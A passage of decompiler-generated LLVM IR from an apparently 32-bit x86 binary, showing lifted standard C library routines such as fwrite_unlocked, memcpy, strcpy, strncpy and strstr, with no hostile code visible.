dec_label_pc_8051d90:                             ; preds = %dec_label_pc_8051d8d.preheader, %dec_label_pc_8051d5f, %dec_label_pc_8051d8b.dec_label_pc_8051d8d_crit_edge, %dec_label_pc_8051d8b, %dec_label_pc_8051d7e
  %v0_8051d90 = load i32, i32* @ebx, align 4
  %v1_8051d90 = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_8051d90, %v1_8051d90
  br i1 %tmp23, label %dec_label_pc_8051d94, label %dec_label_pc_8051d99

dec_label_pc_8051d94:                             ; preds = %dec_label_pc_8051d90
  %v1_8051d94 = inttoptr i32 %v0_8051d90 to i8*
  store i8 0, i8* %v1_8051d94, align 1
  %v0_8051d9e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051d9b

dec_label_pc_8051d99:                             ; preds = %dec_label_pc_8051d90, %dec_label_pc_8051d7e, %entry
  br label %dec_label_pc_8051d9b

dec_label_pc_8051d9b:                             ; preds = %dec_label_pc_8051d94, %dec_label_pc_8051d99
  %v0_8051d9e = phi i32 [ %v0_8051d9e.pre, %dec_label_pc_8051d94 ], [ 0, %dec_label_pc_8051d99 ]
  store i32 %v0_8051d9e, i32* %eax.global-to-local, align 4
  store i32 %v0_8051d3c, i32* @ebp, align 4
  ret i32 %v0_8051d9e

; uselistorder directives
  uselistorder i32 %v0_8051d9e, { 1, 0 }
  uselistorder i32 %v0_8051d90, { 1, 0 }
  uselistorder i32 %v1_8051d8d, { 1, 0 }
  uselistorder i32 %v0_8051d71, { 0, 2, 1 }
  uselistorder i32 %v0_8051d57, { 1, 0 }
  uselistorder label %dec_label_pc_8051d9b, { 1, 0 }
  uselistorder label %dec_label_pc_8051d90, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_8051d8b.dec_label_pc_8051d8d_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8051d57, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8051da8 = load i32, i32* @esi, align 4
  %v0_8051da9 = load i32, i32* @ebx, align 4
  store i32 %v0_8051da9, i32* %stack_var_-8, align 4
  %v4_8051dad = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051dad, i32* @ebx, align 4
  %v3_8051db2 = call i32 @strlen(i8* %arg1)
  store i32 %v3_8051db2, i32* @esi, align 4
  %v0_8051dc3 = load i32, i32* @ebx, align 4
  %v6_8051dc4 = call i32 @__GI_fwrite_unlocked(i32 %v0_8051dc3, i64 1, i32 %v3_8051db2, i32 %arg2)
  %v1_8051dcf = load i32, i32* @esi, align 4
  %v12_8051dcf = icmp eq i32 %v6_8051dc4, %v1_8051dcf
  %v1_8051dd1 = icmp eq i1 %v12_8051dcf, false
  br i1 %v1_8051dd1, label %dec_label_pc_8051dd5, label %dec_label_pc_8051dd3

dec_label_pc_8051dd3:                             ; preds = %entry
  br label %dec_label_pc_8051dd5

dec_label_pc_8051dd5:                             ; preds = %entry, %dec_label_pc_8051dd3
  %v0_8051dd5 = phi i32 [ -1, %entry ], [ %v6_8051dc4, %dec_label_pc_8051dd3 ]
  %v2_8051dd8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051dd8, i32* @ebx, align 4
  store i32 %v0_8051da8, i32* @esi, align 4
  ret i32 %v0_8051dd5

; uselistorder directives
  uselistorder i32 %v6_8051dc4, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051dd5, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_8051ddc = load i32, i32* @edi, align 4
  %v0_8051ddd = load i32, i32* @esi, align 4
  %v0_8051dde = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_8051de3 = trunc i64 %arg2 to i32
  store i32 %v4_8051de3, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_8051deb = inttoptr i32 %arg4 to i16*
  %v2_8051deb = load i16, i16* %v1_8051deb, align 2
  %v1_8051dee = and i16 %v2_8051deb, 192
  %v6_8051df3 = icmp eq i16 %v1_8051dee, 192
  br i1 %v6_8051df3, label %dec_label_pc_8051e0e, label %dec_label_pc_8051dfa

dec_label_pc_8051dfa:                             ; preds = %entry
  %v0_8051dfa = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v9_8051e02 = call i32 @__stdio_trans2w_o(i16* %v1_8051deb, i32 128, i32 %v0_8051dfa, i32 %v0_8051dfa, i32 %v0_8051dde, i32 %v0_8051ddd, i32 %v0_8051ddc)
  %v1_8051e0a = icmp eq i32 %v9_8051e02, 0
  %v1_8051e0c = icmp eq i1 %v1_8051e0a, false
  br i1 %v1_8051e0c, label %dec_label_pc_8051e4a, label %dec_label_pc_8051e0e

dec_label_pc_8051e0e:                             ; preds = %dec_label_pc_8051dfa, %entry
  %v2_8051e0e = icmp eq i32 %v4_8051de3, 0
  br i1 %v2_8051e0e, label %dec_label_pc_8051e4a, label %dec_label_pc_8051e12

dec_label_pc_8051e12:                             ; preds = %dec_label_pc_8051e0e
  %v1_8051e12 = icmp eq i32 %arg3, 0
  br i1 %v1_8051e12, label %dec_label_pc_8051e4a, label %dec_label_pc_8051e16

dec_label_pc_8051e16:                             ; preds = %dec_label_pc_8051e12
  %v9_8051e1b = udiv i64 4294967295, %arg2
  %v10_8051e1b = trunc i64 %v9_8051e1b to i32
  %v6_8051e1f = icmp ult i32 %v10_8051e1b, %arg3
  br i1 %v6_8051e1f, label %dec_label_pc_8051e3b, label %dec_label_pc_8051e21

dec_label_pc_8051e21:                             ; preds = %dec_label_pc_8051e16
  %sext = mul i64 %arg2, 4294967296
  %v2_8051e24 = sdiv i64 %sext, 4294967296
  %v3_8051e24 = sext i32 %arg3 to i64
  %v4_8051e24 = mul nsw i64 %v3_8051e24, %v2_8051e24
  %v5_8051e24 = trunc i64 %v4_8051e24 to i32
  %v0_8051e27 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_8051e2d = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_8051e24, i32 %v0_8051e27, i32 %v10_8051e1b)
  %v6_8051e2d = sext i32 %v5_8051e2d to i64
  %v10_8051e34 = udiv i64 %v6_8051e2d, %arg2
  %v11_8051e34 = trunc i64 %v10_8051e34 to i32
  br label %dec_label_pc_8051e4c

dec_label_pc_8051e3b:                             ; preds = %dec_label_pc_8051e16
  %v0_8051e3b = load i32, i32* @ebx, align 4
  %v1_8051e3b = inttoptr i32 %v0_8051e3b to i16*
  %v2_8051e3b = load i16, i16* %v1_8051e3b, align 2
  %v3_8051e3b = or i16 %v2_8051e3b, 8
  store i16 %v3_8051e3b, i16* %v1_8051e3b, align 2
  %v0_8051e3f = load i32, i32* %stack_var_-28, align 4
  %v1_8051e3f = call i32 @__errno_location(i32 %v0_8051e3f)
  %v1_8051e44 = inttoptr i32 %v1_8051e3f to i32*
  store i32 22, i32* %v1_8051e44, align 4
  br label %dec_label_pc_8051e4a

dec_label_pc_8051e4a:                             ; preds = %dec_label_pc_8051e12, %dec_label_pc_8051e0e, %dec_label_pc_8051dfa, %dec_label_pc_8051e3b
  br label %dec_label_pc_8051e4c

dec_label_pc_8051e4c:                             ; preds = %dec_label_pc_8051e21, %dec_label_pc_8051e4a
  %v0_8051e4f = phi i32 [ %v11_8051e34, %dec_label_pc_8051e21 ], [ 0, %dec_label_pc_8051e4a ]
  store i32 %v0_8051ddd, i32* @esi, align 4
  store i32 %v0_8051ddc, i32* @edi, align 4
  ret i32 %v0_8051e4f

; uselistorder directives
  uselistorder i32 %v0_8051dfa, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051e4c, { 1, 0 }
  uselistorder label %dec_label_pc_8051e4a, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051e51 = load i32, i32* @esi, align 4
  store i32 %v0_8051e51, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_8051e52 = sdiv i32 %sext, 16777216
  store i32 %v4_8051e52, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8051e5c = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051e5c, i32* %edi.global-to-local, align 4
  %v2_8051e60 = udiv i32 %v4_8051e52, 4
  %v3_8051e63 = inttoptr i32 %arg2 to i8*
  %v4_8051e63 = bitcast i16* %arg1 to i8*
  %v5_8051e63 = call i8* @_memcpy(i8* %v4_8051e63, i8* %v3_8051e63, i32 %v2_8051e60)
  %v6_8051e63 = ptrtoint i8* %v5_8051e63 to i32
  store i32 %v6_8051e63, i32* @ecx, align 4
  %v0_8051e65 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051e65 = and i32 %v0_8051e65, 2
  %v3_8051e65 = icmp eq i32 %v2_8051e65, 0
  br i1 %v3_8051e65, label %dec_label_pc_8051e6b, label %dec_label_pc_8051e69

dec_label_pc_8051e69:                             ; preds = %entry
  %v0_8051e69 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051e69 = inttoptr i32 %v0_8051e69 to i16*
  %v2_8051e69 = load i16, i16* %v1_8051e69, align 2
  %v3_8051e69 = load i32, i32* %edi.global-to-local, align 4
  %v4_8051e69 = inttoptr i32 %v3_8051e69 to i16*
  store i16 %v2_8051e69, i16* %v4_8051e69, align 2
  %v5_8051e69 = load i32, i32* %edi.global-to-local, align 4
  %v6_8051e69 = load i32, i32* %esi.global-to-local, align 4
  %v7_8051e69 = load i1, i1* @df, align 1
  %v8_8051e69 = select i1 %v7_8051e69, i32 -2, i32 2
  %v9_8051e69 = add i32 %v8_8051e69, %v5_8051e69
  %v10_8051e69 = add i32 %v8_8051e69, %v6_8051e69
  store i32 %v9_8051e69, i32* %edi.global-to-local, align 4
  store i32 %v10_8051e69, i32* %esi.global-to-local, align 4
  %v0_8051e6b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051e6b

dec_label_pc_8051e6b:                             ; preds = %entry, %dec_label_pc_8051e69
  %v0_8051e6b = phi i32 [ %v0_8051e65, %entry ], [ %v0_8051e6b.pre, %dec_label_pc_8051e69 ]
  %v2_8051e6b = urem i32 %v0_8051e6b, 2
  %v3_8051e6b = icmp eq i32 %v2_8051e6b, 0
  br i1 %v3_8051e6b, label %dec_label_pc_8051e70, label %dec_label_pc_8051e6f

dec_label_pc_8051e6f:                             ; preds = %dec_label_pc_8051e6b
  %v0_8051e6f = load i32, i32* %esi.global-to-local, align 4
  %v1_8051e6f = inttoptr i32 %v0_8051e6f to i8*
  %v2_8051e6f = load i8, i8* %v1_8051e6f, align 1
  %v3_8051e6f = load i32, i32* %edi.global-to-local, align 4
  %v4_8051e6f = inttoptr i32 %v3_8051e6f to i8*
  store i8 %v2_8051e6f, i8* %v4_8051e6f, align 1
  %v5_8051e6f = load i32, i32* %edi.global-to-local, align 4
  %v6_8051e6f = load i32, i32* %esi.global-to-local, align 4
  %v7_8051e6f = load i1, i1* @df, align 1
  %v8_8051e6f = select i1 %v7_8051e6f, i32 -1, i32 1
  %v9_8051e6f = add i32 %v8_8051e6f, %v5_8051e6f
  %v10_8051e6f = add i32 %v8_8051e6f, %v6_8051e6f
  store i32 %v9_8051e6f, i32* %edi.global-to-local, align 4
  store i32 %v10_8051e6f, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051e70

dec_label_pc_8051e70:                             ; preds = %dec_label_pc_8051e6b, %dec_label_pc_8051e6f
  store i32 %v4_8051e5c, i32* %eax.global-to-local, align 4
  %v2_8051e74 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051e74, i32* @esi, align 4
  ret i32 %v4_8051e5c

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_8051e70, { 1, 0 }
  uselistorder label %dec_label_pc_8051e6b, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_8051e78 = load i32, i32* @edi, align 4
  %v4_8051e81 = ptrtoint i8* %arg1 to i32
  %v5_8051e85 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_8051e85 = ptrtoint i8* %v5_8051e85 to i32
  store i32 %v6_8051e85, i32* @ecx, align 4
  store i32 %v0_8051e78, i32* @edi, align 4
  ret i32 %v4_8051e81

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051e91 = load i32, i32* @esi, align 4
  store i32 %v0_8051e91, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_8051e9b = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051e9b, i32* %edi.global-to-local, align 4
  %v3_8051e9f = call i32 @_strlen(i8* %arg1)
  %v2_8051ea1 = add i32 %v4_8051e9b, -1
  store i32 %v2_8051ea1, i32* %edi.global-to-local, align 4
  %v8_8051ea2.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8051ea2

dec_label_pc_8051ea2:                             ; preds = %dec_label_pc_8051ea2, %entry
  %v2_8051ea3 = phi i32 [ %v7_8051ea3, %dec_label_pc_8051ea2 ], [ %v2_8051ea1, %entry ]
  %v8_8051ea2 = phi i1 [ %v5_8051ea3, %dec_label_pc_8051ea2 ], [ %v8_8051ea2.pre, %entry ]
  %v4_8051ea2 = phi i32 [ %v0_8051ea4, %dec_label_pc_8051ea2 ], [ 0, %entry ]
  %v0_8051ea2 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051ea2 = inttoptr i32 %v0_8051ea2 to i8*
  %v2_8051ea2 = load i8, i8* %v1_8051ea2, align 1
  %v3_8051ea2 = zext i8 %v2_8051ea2 to i32
  %v5_8051ea2 = and i32 %v4_8051ea2, -256
  %v6_8051ea2 = or i32 %v3_8051ea2, %v5_8051ea2
  store i32 %v6_8051ea2, i32* %eax.global-to-local, align 4
  %v9_8051ea2 = select i1 %v8_8051ea2, i32 -1, i32 1
  %v10_8051ea2 = add i32 %v0_8051ea2, %v9_8051ea2
  store i32 %v10_8051ea2, i32* %esi.global-to-local, align 4
  %v3_8051ea3 = inttoptr i32 %v2_8051ea3 to i8*
  store i8 %v2_8051ea2, i8* %v3_8051ea3, align 1
  %v4_8051ea3 = load i32, i32* %edi.global-to-local, align 4
  %v5_8051ea3 = load i1, i1* @df, align 1
  %v6_8051ea3 = select i1 %v5_8051ea3, i32 -1, i32 1
  %v7_8051ea3 = add i32 %v6_8051ea3, %v4_8051ea3
  store i32 %v7_8051ea3, i32* %edi.global-to-local, align 4
  %v0_8051ea4 = load i32, i32* %eax.global-to-local, align 4
  %v3_8051ea4 = trunc i32 %v0_8051ea4 to i8
  %v4_8051ea4 = icmp eq i8 %v3_8051ea4, 0
  %v1_8051ea6 = icmp eq i1 %v4_8051ea4, false
  br i1 %v1_8051ea6, label %dec_label_pc_8051ea2, label %dec_label_pc_8051ea8

dec_label_pc_8051ea8:                             ; preds = %dec_label_pc_8051ea2
  store i32 %v4_8051e9b, i32* %eax.global-to-local, align 4
  %v2_8051eac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051eac, i32* @esi, align 4
  ret i32 %v4_8051e9b

; uselistorder directives
  uselistorder i32 %v0_8051ea4, { 1, 0 }
  uselistorder i32 %v7_8051ea3, { 1, 0 }
  uselistorder i1 %v5_8051ea3, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8051eb1 = ptrtoint i8* %arg1 to i32
  %v2_8051eb9 = mul i32 %arg2, 256
  %v3_8051eb9 = and i32 %v2_8051eb9, 65280
  %v4_8051eb9 = and i32 %arg2, -65281
  %v5_8051eb9 = or i32 %v3_8051eb9, %v4_8051eb9
  %v8_8051ebb.pre = load i1, i1* @df, align 1
  %v9_8051ebb = select i1 %v8_8051ebb.pre, i32 -1, i32 1
  br label %dec_label_pc_8051ebb

dec_label_pc_8051ebb:                             ; preds = %dec_label_pc_8051ec0, %entry
  %v4_8051ebb = phi i32 [ %v6_8051ebb, %dec_label_pc_8051ec0 ], [ %v5_8051eb9, %entry ]
  %v7_8051ebb = phi i32 [ %v10_8051ebb, %dec_label_pc_8051ec0 ], [ %v4_8051eb1, %entry ]
  %v1_8051ebb = inttoptr i32 %v7_8051ebb to i8*
  %v2_8051ebb = load i8, i8* %v1_8051ebb, align 1
  %v10_8051ebb = add i32 %v7_8051ebb, %v9_8051ebb
  %v3_8051ebc = udiv i32 %v4_8051ebb, 256
  %v4_8051ebc = trunc i32 %v3_8051ebc to i8
  %v16_8051ebc = icmp eq i8 %v2_8051ebb, %v4_8051ebc
  br i1 %v16_8051ebc, label %dec_label_pc_8051ec9.loopexit, label %dec_label_pc_8051ec0

dec_label_pc_8051ec0:                             ; preds = %dec_label_pc_8051ebb
  %v3_8051ebb = zext i8 %v2_8051ebb to i32
  %v5_8051ebb = and i32 %v4_8051ebb, -256
  %v6_8051ebb = or i32 %v3_8051ebb, %v5_8051ebb
  %v4_8051ec0 = icmp eq i8 %v2_8051ebb, 0
  %v1_8051ec2 = icmp eq i1 %v4_8051ec0, false
  br i1 %v1_8051ec2, label %dec_label_pc_8051ebb, label %dec_label_pc_8051ec4

dec_label_pc_8051ec4:                             ; preds = %dec_label_pc_8051ec0
  br label %dec_label_pc_8051ec9

dec_label_pc_8051ec9.loopexit:                    ; preds = %dec_label_pc_8051ebb
  %phitmp = add i32 %v10_8051ebb, -1
  br label %dec_label_pc_8051ec9

dec_label_pc_8051ec9:                             ; preds = %dec_label_pc_8051ec9.loopexit, %dec_label_pc_8051ec4
  %v0_8051ec9 = phi i32 [ 0, %dec_label_pc_8051ec4 ], [ %phitmp, %dec_label_pc_8051ec9.loopexit ]
  ret i32 %v0_8051ec9

; uselistorder directives
  uselistorder i8 %v2_8051ebb, { 1, 2, 0 }
  uselistorder i32 %v4_8051ebb, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051ed1 = load i32, i32* @esi, align 4
  store i32 %v0_8051ed1, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8051ed9 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051ed9, i32* %edi.global-to-local, align 4
  %v4_8051edd.pre = load i32, i32* @eax, align 4
  %v8_8051edd.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8051edd

dec_label_pc_8051edd:                             ; preds = %dec_label_pc_8051edd.dec_label_pc_8051edd_crit_edge, %entry
  %v2_8051ede = phi i32 [ %v7_8051ede, %dec_label_pc_8051edd.dec_label_pc_8051edd_crit_edge ], [ %v4_8051ed9, %entry ]
  %v8_8051edd = phi i1 [ %v5_8051ede, %dec_label_pc_8051edd.dec_label_pc_8051edd_crit_edge ], [ %v8_8051edd.pre, %entry ]
  %v4_8051edd = phi i32 [ %v0_8051edf, %dec_label_pc_8051edd.dec_label_pc_8051edd_crit_edge ], [ %v4_8051edd.pre, %entry ]
  %v7_8051edd = phi i32 [ %v0_8051edd.pre, %dec_label_pc_8051edd.dec_label_pc_8051edd_crit_edge ], [ %arg2, %entry ]
  %v1_8051edd = inttoptr i32 %v7_8051edd to i8*
  %v2_8051edd = load i8, i8* %v1_8051edd, align 1
  %v3_8051edd = zext i8 %v2_8051edd to i32
  %v5_8051edd = and i32 %v4_8051edd, -256
  %v6_8051edd = or i32 %v3_8051edd, %v5_8051edd
  store i32 %v6_8051edd, i32* %eax.global-to-local, align 4
  %v9_8051edd = select i1 %v8_8051edd, i32 -1, i32 1
  %v10_8051edd = add i32 %v7_8051edd, %v9_8051edd
  store i32 %v10_8051edd, i32* %esi.global-to-local, align 4
  %v3_8051ede = inttoptr i32 %v2_8051ede to i8*
  store i8 %v2_8051edd, i8* %v3_8051ede, align 1
  %v4_8051ede = load i32, i32* %edi.global-to-local, align 4
  %v5_8051ede = load i1, i1* @df, align 1
  %v6_8051ede = select i1 %v5_8051ede, i32 -1, i32 1
  %v7_8051ede = add i32 %v6_8051ede, %v4_8051ede
  store i32 %v7_8051ede, i32* %edi.global-to-local, align 4
  %v0_8051edf = load i32, i32* %eax.global-to-local, align 4
  %v3_8051edf = trunc i32 %v0_8051edf to i8
  %v4_8051edf = icmp eq i8 %v3_8051edf, 0
  %v1_8051ee1 = icmp eq i1 %v4_8051edf, false
  br i1 %v1_8051ee1, label %dec_label_pc_8051edd.dec_label_pc_8051edd_crit_edge, label %dec_label_pc_8051ee3

dec_label_pc_8051edd.dec_label_pc_8051edd_crit_edge: ; preds = %dec_label_pc_8051edd
  %v0_8051edd.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051edd

dec_label_pc_8051ee3:                             ; preds = %dec_label_pc_8051edd
  store i32 %v4_8051ed9, i32* %eax.global-to-local, align 4
  %v2_8051ee7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051ee7, i32* @edx, align 4
  %v2_8051ee8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051ee8, i32* @esi, align 4
  ret i32 %v4_8051ed9

; uselistorder directives
  uselistorder i32 %v0_8051edf, { 1, 0 }
  uselistorder i32 %v7_8051ede, { 1, 0 }
  uselistorder i1 %v5_8051ede, { 1, 0 }
  uselistorder i32 %v4_8051ed9, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051f01 = load i32, i32* @esi, align 4
  store i32 %v0_8051f01, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8051f0d = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051f0d, i32* %edi.global-to-local, align 4
  %v1_8051f11 = add i32 %arg3, 1
  store i32 %v1_8051f11, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051f12

dec_label_pc_8051f12:                             ; preds = %dec_label_pc_8051f15, %entry
  %v3_8051f16 = phi i32 [ %v4_8051f0d, %entry ], [ %v8_8051f16, %dec_label_pc_8051f15 ]
  %v0_8051f12 = phi i32 [ %v1_8051f11, %entry ], [ %v0_8051f12.pre, %dec_label_pc_8051f15 ]
  %v1_8051f12 = add i32 %v0_8051f12, -1
  %v8_8051f12 = icmp eq i32 %v1_8051f12, 0
  store i32 %v1_8051f12, i32* %ecx.global-to-local, align 4
  br i1 %v8_8051f12, label %.loopexit, label %dec_label_pc_8051f15

dec_label_pc_8051f15:                             ; preds = %dec_label_pc_8051f12
  %v0_8051f15 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051f15 = inttoptr i32 %v0_8051f15 to i8*
  %v2_8051f15 = load i8, i8* %v1_8051f15, align 1
  %v10_8051f15 = load i1, i1* @df, align 1
  %v11_8051f15 = select i1 %v10_8051f15, i32 -1, i32 1
  %v12_8051f15 = add i32 %v11_8051f15, %v0_8051f15
  store i32 %v12_8051f15, i32* %esi.global-to-local, align 4
  %v4_8051f16 = inttoptr i32 %v3_8051f16 to i8*
  store i8 %v2_8051f15, i8* %v4_8051f16, align 1
  %v5_8051f16 = load i32, i32* %edi.global-to-local, align 4
  %v6_8051f16 = load i1, i1* @df, align 1
  %v7_8051f16 = select i1 %v6_8051f16, i32 -1, i32 1
  %v8_8051f16 = add i32 %v7_8051f16, %v5_8051f16
  store i32 %v8_8051f16, i32* %edi.global-to-local, align 4
  %v6_8051f17 = icmp eq i8 %v2_8051f15, 0
  %v1_8051f19 = icmp eq i1 %v6_8051f17, false
  %v0_8051f12.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_8051f19, label %dec_label_pc_8051f12, label %dec_label_pc_8051f1b

dec_label_pc_8051f1b:                             ; preds = %dec_label_pc_8051f15
  %v1_8051f1b = add i32 %v0_8051f12.pre, -1
  store i32 %v1_8051f1b, i32* %ecx.global-to-local, align 4
  %v2_8051f1c = sext i8 %v2_8051f15 to i32
  %v4_8051f1c = inttoptr i32 %v8_8051f16 to i8*
  %v5_8051f1c = call i8* @_memset(i8* %v4_8051f1c, i32 %v2_8051f1c, i32 %v1_8051f1b)
  %v6_8051f1c = ptrtoint i8* %v5_8051f1c to i32
  store i32 %v6_8051f1c, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_8051f12, %dec_label_pc_8051f1b
  %v2_8051f22 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051f22, i32* @edx, align 4
  %v2_8051f23 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051f23, i32* @esi, align 4
  ret i32 %v4_8051f0d

; uselistorder directives
  uselistorder i32 %v8_8051f16, { 0, 2, 1 }
  uselistorder i8 %v2_8051f15, { 0, 2, 1 }
  uselistorder i32 %v1_8051f12, { 1, 0 }
  uselistorder i32 %v4_8051f0d, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_2()
  %v4_8051f28 = ptrtoint i8* %tmp4 to i32
  %v8_8051f3b5 = icmp eq i32 %tmp, 0
  %v1_8051f3c6 = icmp eq i1 %v8_8051f3b5, false
  br i1 %v1_8051f3c6, label %dec_label_pc_8051f35, label %dec_label_pc_8051f3e

dec_label_pc_8051f35:                             ; preds = %entry, %dec_label_pc_8051f3a
  %v1_8051f3b8 = phi i32 [ %v1_8051f3b, %dec_label_pc_8051f3a ], [ %tmp, %entry ]
  %v0_8051f3e7 = phi i32 [ %v1_8051f3a, %dec_label_pc_8051f3a ], [ %v4_8051f28, %entry ]
  %v1_8051f35 = inttoptr i32 %v0_8051f3e7 to i8*
  %v2_8051f35 = load i8, i8* %v1_8051f35, align 1
  %v3_8051f35 = icmp eq i8 %v2_8051f35, 0
  br i1 %v3_8051f35, label %dec_label_pc_8051f3e, label %dec_label_pc_8051f3a

dec_label_pc_8051f3a:                             ; preds = %dec_label_pc_8051f35
  %v1_8051f3a = add i32 %v0_8051f3e7, 1
  %v1_8051f3b = add i32 %v1_8051f3b8, -1
  %v8_8051f3b = icmp eq i32 %v1_8051f3b, 0
  %v1_8051f3c = icmp eq i1 %v8_8051f3b, false
  br i1 %v1_8051f3c, label %dec_label_pc_8051f35, label %dec_label_pc_8051f3e

dec_label_pc_8051f3e:                             ; preds = %dec_label_pc_8051f3a, %dec_label_pc_8051f35, %entry
  %v0_8051f3e.lcssa = phi i32 [ %v4_8051f28, %entry ], [ %v0_8051f3e7, %dec_label_pc_8051f35 ], [ %v1_8051f3a, %dec_label_pc_8051f3a ]
  %v2_8051f3e = sub i32 %v0_8051f3e.lcssa, %v4_8051f28
  ret i32 %v2_8051f3e

; uselistorder directives
  uselistorder i32 %v1_8051f3b, { 1, 0 }
  uselistorder i32 %v0_8051f3e7, { 0, 2, 1 }
  uselistorder i32 %v4_8051f28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051f35, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %v0_8051f47 = load i32, i32* @ebx, align 4
  %v4_8051f4b = ptrtoint i8* %arg2 to i32
  %v2_8051f53 = load i8, i8* %arg2, align 1
  %v1_8051f56 = icmp eq i8 %v2_8051f53, 0
  br i1 %v1_8051f56, label %dec_label_pc_8052003, label %dec_label_pc_8051f5e

dec_label_pc_8051f5e:                             ; preds = %entry
  %v1_8051f5e = add i32 %arg1, -1
  br label %dec_label_pc_8051f5f

dec_label_pc_8051f5f:                             ; preds = %dec_label_pc_8051f6b, %dec_label_pc_8051f5e
  %v0_8051f5f = phi i32 [ %v1_8051f5f, %dec_label_pc_8051f6b ], [ %v1_8051f5e, %dec_label_pc_8051f5e ]
  %v1_8051f5f = add i32 %v0_8051f5f, 1
  %v1_8051f60 = inttoptr i32 %v1_8051f5f to i8*
  %v2_8051f60 = load i8, i8* %v1_8051f60, align 1
  %v1_8051f63 = icmp eq i8 %v2_8051f60, 0
